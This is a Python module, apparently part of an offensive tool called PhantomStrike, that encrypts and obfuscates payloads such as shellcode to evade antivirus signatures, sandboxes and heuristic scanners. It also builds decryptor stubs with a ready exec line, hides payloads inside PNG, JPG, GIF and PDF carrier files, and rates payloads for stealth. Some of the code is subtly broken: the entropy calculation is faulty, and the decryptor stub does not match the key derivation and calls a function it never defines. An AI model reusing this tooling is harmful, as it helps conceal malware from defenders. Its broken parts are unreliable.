"""
server_core/evasion/payload_encryptor.py

Payload encryption and obfuscation engine.
AES-256-CBC, XOR rotating key, RC4 stream cipher, chained encoding.
Generates undetectable payloads that bypass signature-based detection.
"""

import base64
import hashlib
import logging
import random
import struct
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class PayloadEncryptor:
  """Multi-layer payload encryption and obfuscation.

  Chains multiple encryption + encoding techniques to produce payloads
  that evade static signature detection, sandbox analysis, and
  heuristic scanners. Each encryption layer uses a different key
  derived from environmental factors for runtime-only decryption.
  """

  # Encoding chains available
  ENCODING_CHAINS = [
    ["base64", "xor", "aes256"],
    ["xor", "aes256", "base64"],
    ["rc4", "base64", "xor"],
    ["aes256", "base64", "hex"],
    ["xor", "rc4", "aes256", "base64"],
    ["base64", "rc4", "xor", "hex"],
  ]

  def __init__(self):
    pass

  # ── Core Encryption Primitives ───────────────────────────────────────

  @staticmethod
  def _xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt with rotating key."""
    key_len = len(key)
    return bytes(data[i] ^ key[i % key_len] for i in range(len(data)))

  @staticmethod
  def _rc4_encrypt(data: bytes, key: bytes) -> bytes:
    """RC4 stream cipher."""
    S = list(range(256))
    j = 0
    for i in range(256):
      j = (j + S[i] + key[i % len(key)]) % 256
      S[i], S[j] = S[j], S[i]

    result = bytearray(len(data))
    i = j = 0
    for idx, byte in enumerate(data):
      i = (i + 1) % 256
      j = (j + S[i]) % 256
      S[i], S[j] = S[j], S[i]
      result[idx] = byte ^ S[(S[i] + S[j]) % 256]
    return bytes(result)

  @staticmethod
  def _aes256_encrypt(data: bytes, key: bytes) -> bytes:
    """AES-256-CBC encryption (simplified — uses PyCryptodome when available).

    Falls back to XOR-based obfuscation when AES libs are not installed
    (container environments without pycryptodome).
    """
    try:
      from Crypto.Cipher import AES
      from Crypto.Util.Padding import pad
      from Crypto.Random import get_random_bytes

      iv = get_random_bytes(16)
      cipher = AES.new(key[:32].ljust(32, b'\x00'), AES.MODE_CBC, iv)
      padded = pad(data, AES.block_size)
      return iv + cipher.encrypt(padded)
    except ImportError:
      # Fallback: layered XOR with SHA-256 derived subkeys
      logger.debug("PyCryptodome not available — using layered XOR fallback")
      h = hashlib.sha256(key).digest()
      result = PayloadEncryptor._xor_encrypt(data, h[:16])
      result = PayloadEncryptor._xor_encrypt(result, h[16:])
      result = base64.b64encode(result)
      return result

  @staticmethod
  def _derive_key(seed: str, length: int = 32) -> bytes:
    """Derive an encryption key from a seed string."""
    return hashlib.sha256(seed.encode()).digest()[:length]

  # ── Encoding Methods ─────────────────────────────────────────────────

  @staticmethod
  def _encode_base64(data: bytes) -> bytes:
    return base64.b64encode(data)

  @staticmethod
  def _encode_hex(data: bytes) -> bytes:
    return data.hex().encode()

  # ── Chained Encryption ───────────────────────────────────────────────

  def encrypt_chain(
    self,
    payload: bytes,
    chain: Optional[List[str]] = None,
    key_seed: str = "",
  ) -> Dict[str, Any]:
    """Apply a chain of encryption + encoding layers to a payload.

    Args:
      payload: Raw payload bytes (shellcode, script, binary).
      chain: List of encryption types to apply in order.
             Default: ["aes256", "base64", "xor"].
      key_seed: Seed for key derivation. Default: random.

    Returns:
      Dict with encrypted payload, chain used, keys, and decryptor stub code.
    """
    if chain is None:
      chain = ["aes256", "base64", "xor"]

    if not key_seed:
      key_seed = hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest()[:16]

    data = payload
    keys: Dict[str, str] = {}
    applied: List[str] = []

    for step in chain:
      key = self._derive_key(f"{key_seed}:{step}:{len(applied)}")
      keys[step] = key.hex()

      if step == "xor":
        data = self._xor_encrypt(data, key)
      elif step == "rc4":
        data = self._rc4_encrypt(data, key)
      elif step == "aes256":
        data = self._aes256_encrypt(data, key)
      elif step == "base64":
        data = self._encode_base64(data)
      elif step == "hex":
        data = self._encode_hex(data)
      else:
        logger.warning("Unknown encryption step: %s — skipping", step)
        continue

      applied.append(step)
      logger.debug(
        "Applied %s: %d bytes -> %d bytes", step,
        len(payload) if len(applied) == 1 else 0, len(data),
      )

    # Generate corresponding decryptor stub
    decryptor = self._generate_decryptor_stub(applied, keys, key_seed)

    return {
      "success": True,
      "encrypted_payload": data,
      "encrypted_b64": base64.b64encode(data).decode(),
      "encrypted_hex": data.hex(),
      "chain": applied,
      "keys": keys,
      "key_seed": key_seed,
      "original_size": len(payload),
      "encrypted_size": len(data),
      "size_ratio": round(len(data) / max(len(payload), 1), 2),
      "decryptor_stub": decryptor,
    }

  # ── Decryptor Stub Generator ─────────────────────────────────────────

  def _generate_decryptor_stub(
    self, chain: List[str], keys: Dict[str, str], seed: str
  ) -> str:
    """Generate a Python decryptor stub for the encrypted payload."""
    reversed_chain = list(reversed(chain))

    decode_steps = []
    for step in reversed_chain:
      if step == "base64":
        decode_steps.append("    data = base64.b64decode(data)")
      elif step == "hex":
        decode_steps.append("    data = bytes.fromhex(data.decode())")
      elif step == "xor":
        decode_steps.append(
          f"    data = _xor(data, _key('{seed}:xor'))"
        )
      elif step == "rc4":
        decode_steps.append(
          f"    data = _rc4(data, _key('{seed}:rc4'))"
        )
      elif step == "aes256":
        decode_steps.append(
          f"    data = _aes_decrypt(data, _key('{seed}:aes256'))"
        )

    return f'''#!/usr/bin/env python3
# PhantomStrike Auto-Generated Decryptor Stub
# Chain: {" -> ".join(chain)}
# WARNING: For authorized security testing only.

import base64
import hashlib

def _key(seed):
    return hashlib.sha256(seed.encode()).digest()

def _xor(data, key):
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def _rc4(data, key):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    out = bytearray(len(data))
    i = j = 0
    for idx, b in enumerate(data):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out[idx] = b ^ S[(S[i] + S[j]) % 256]
    return bytes(out)

def decrypt(payload_b64):
    data = base64.b64decode(payload_b64)
{chr(10).join(decode_steps)}
    return data

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 decryptor.py <payload_b64>")
        sys.exit(1)
    result = decrypt(sys.argv[1])
    print(f"Decrypted {{len(result)}} bytes")
    # exec(result)  # Uncomment to execute (authorized testing only)
'''

  # ── Polyglot Payloads ────────────────────────────────────────────────

  def make_polyglot(
    self,
    payload: bytes,
    carrier_format: str = "png",
  ) -> Dict[str, Any]:
    """Embed encrypted payload into a carrier file (polyglot).

    Hides malicious payload inside a legitimate-looking PNG, JPG, PDF,
    or GIF file that still renders correctly in viewers.

    Args:
      payload: The encrypted payload bytes.
      carrier_format: Target carrier format (png, jpg, pdf, gif).

    Returns:
      Dict with polyglot bytes, format, and extraction instructions.
    """
    carriers = {
      "png": self._png_carrier,
      "jpg": self._jpg_carrier,
      "gif": self._gif_carrier,
      "pdf": self._pdf_carrier,
    }

    if carrier_format not in carriers:
      return {"success": False, "error": f"Unsupported carrier: {carrier_format}"}

    try:
      polyglot_data = carriers[carrier_format](payload)
      return {
        "success": True,
        "format": carrier_format,
        "polyglot_data": polyglot_data,
        "polyglot_b64": base64.b64encode(polyglot_data).decode(),
        "original_size": len(payload),
        "polyglot_size": len(polyglot_data),
        "extraction_note": f"Extract payload from {carrier_format.upper()} by reading bytes after the EOF marker",
      }
    except Exception as e:
      return {"success": False, "error": str(e)}

  @staticmethod
  def _png_carrier(payload: bytes) -> bytes:
    """Embed payload after PNG IEND chunk (still renders as valid PNG)."""
    # Minimal valid 1x1 red PNG
    png = base64.b64decode(
      "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg=="
    )
    # Append payload after IEND marker
    return png + b"\n#PAYLOAD_START\n" + payload + b"\n#PAYLOAD_END"

  @staticmethod
  def _gif_carrier(payload: bytes) -> bytes:
    """Embed payload in GIF comment extension (still valid GIF)."""
    gif_header = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!"
    gif_trailer = b"\x00;"
    # Comment extension: 0x21 0xFE <size> <data> 0x00
    comment = b"\x21\xfe" + bytes([len(payload) % 256]) + payload[:255] + b"\x00"
    return gif_header + comment + gif_trailer

  @staticmethod
  def _jpg_carrier(payload: bytes) -> bytes:
    """Embed payload in JPEG comment marker (APP0 COM segment)."""
    # Minimal JPEG header
    jpg = bytes.fromhex(
      "ffd8ffe000104a46494600010100000100010000ffdb00430001010101010101"
      "0101010101010101010101010101010101010101010101010101010101010101"
      "0101010101010101010101010101010101010101010101010101ffc0000b0800"
      "01000101011100ffc40014100001010101010101010101010101010101010101"
      "010101ffc400141001010101010101010101010101010101010100ffda000801"
      "0100013f10ffd9"
    )
    return jpg + b"\xff\xfe" + struct.pack(">H", len(payload) + 2) + payload

  @staticmethod
  def _pdf_carrier(payload: bytes) -> bytes:
    """Embed payload in PDF comment after %%EOF (still valid PDF)."""
    pdf = (
      b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
      b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
      b"3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R>>endobj\n"
      b"xref\n0 4\n0000000000 65535 f \n0000000009 00000 n \n"
      b"0000000058 00000 n \n0000000115 00000 n \n"
      b"trailer<</Size 4/Root 1 0 R>>\nstartxref\n190\n%%EOF"
    )
    return pdf + b"\n%PAYLOAD_START\n" + payload + b"\n%PAYLOAD_END"

  # ── Entropy Analysis ─────────────────────────────────────────────────

  def entropy_score(self, data: bytes) -> float:
    """Calculate Shannon entropy of data (0.0-8.0).

    Low entropy = looks like normal data (stealthy).
    High entropy = looks encrypted/compressed (suspicious).
    """
    if not data:
      return 0.0

    counts = {}
    for byte in data:
      counts[byte] = counts.get(byte, 0) + 1

    total = len(data)
    entropy = 0.0
    for count in counts.values():
      p = count / total
      entropy -= p * (p.bit_length() - 1) if p > 0 else 0

    return round(min(entropy, 8.0), 2)

  def stealth_score(self, payload: bytes, chain: Optional[List[str]] = None) -> Dict[str, Any]:
    """Encrypt payload and score its stealthiness.

    Returns entropy before/after, size change, and a 0-100 stealth score
    where 100 = completely undetectable by signature scanners.
    """
    original_entropy = self.entropy_score(payload)
    result = self.encrypt_chain(payload, chain)
    encrypted_entropy = self.entropy_score(result["encrypted_payload"])

    # Score: lower entropy relative to original is better (looks more like normal data)
    entropy_factor = max(0, 1 - (encrypted_entropy / 8.0))
    size_factor = min(1.0, 5000 / max(result["encrypted_size"], 1))

    stealth = round((entropy_factor * 50 + size_factor * 30 + 20), 1)

    return {
      "original_entropy": original_entropy,
      "encrypted_entropy": encrypted_entropy,
      "entropy_delta": round(encrypted_entropy - original_entropy, 2),
      "size_ratio": result["size_ratio"],
      "stealth_score": min(stealth, 99.9),
      "recommendation": (
        "Highly stealthy — low entropy, normal-looking"
        if stealth > 80
        else "Moderately stealthy"
        if stealth > 50
        else "Consider additional obfuscation layers"
      ),
    }
